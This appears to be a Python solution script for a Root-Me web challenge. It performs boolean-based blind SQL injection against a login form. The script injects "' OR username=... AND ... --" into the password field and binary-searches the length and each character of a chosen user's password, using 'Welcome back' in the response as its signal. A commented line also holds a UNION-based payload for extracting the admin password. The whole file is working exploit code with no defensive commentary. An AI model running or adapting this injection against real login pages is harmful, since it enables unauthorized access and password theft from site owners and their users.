#!/usr/bin/env python3
#
import os
import sys
import requests
#
url = "http://challenge.root-me.org/web-serveur/ch10/"
wantedUser = sys.argv[1]
#' AND 1=0 UNION ALL SELECT password,'foobar' from users WHERE username='admin' --
# retrieve cookies env var and construct a nice dict
#cookies_str = os.environ["cookies"]
#cookies = dict([c.split('=', 1) for c in cookies_str.split(';')])
#
# huge speed up (think keep-alive)
#s = requests.session(cookies=cookies)
#
data_def = dict(username='anything',
                password="' OR username='{}' AND {} > {} --")

def getPasswordLength(user, minlen=0, maxlen=50, nbreq=0):
    pass_tmpl = data_def['password'].format(user, 'LENGTH(password)', '{}')
    while minlen < maxlen:
        tmp = (minlen + maxlen) // 2
        r = requests.post(url, {'username': data_def[
                   'username'], 'password': pass_tmpl.format(tmp)})
        nbreq += 1
        if (-1 != r.text.find("Welcome back")):
            # string found -> test is true
            minlen = tmp + 1
        else:
            # false
            maxlen = tmp
    else:
        # minlen == maxlen
        return (minlen, nbreq)
    return (-1, nbreq)
#
#


def getPasswordValue(user, minlen=0, maxlen=25, minAsciiVal=0, maxAsciiVal=127):
    passLength, nbreq = getPasswordLength(user, minlen=minlen, maxlen=maxlen)
    #
    pass_tmpl = data_def['password'].format(
        user, 'SUBSTR(password,{},1)', "'{}'")
    password = []
    for i in range(passLength):
        minDecVal, maxDecVal = minAsciiVal, maxAsciiVal
        while minDecVal < maxDecVal:
            tmp = (minDecVal + maxDecVal) // 2
            char = chr(tmp)
            r = requests.post(url, {'username': data_def[
                       'username'], 'password': pass_tmpl.format(i + 1, char)})
            nbreq += 1
            if (-1 != r.text.find("Welcome back")):
                # string found -> test is true
                minDecVal = tmp + 1
            else:
                # false
                maxDecVal = tmp
        else:
            # minDecVal == maxDecVal
            password.append(chr(minDecVal))
    else:
        return ("".join(password), nbreq)
#
#
password, nbreq = getPasswordValue(wantedUser)
print("{} password = '{}' ({} requests)".format(wantedUser, password, nbreq))
